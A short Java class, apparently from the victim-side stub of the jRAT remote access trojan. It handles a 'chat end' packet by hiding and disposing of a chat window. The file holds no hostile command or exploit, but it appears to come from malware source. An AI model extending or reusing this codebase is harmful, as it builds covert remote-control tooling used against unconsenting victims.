package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;

public class Packet49ChatEnd extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		con.getFrameChat().setVisible(false);
		con.getFrameChat().dispose();
		con.setFrameChat(null);
	}

}
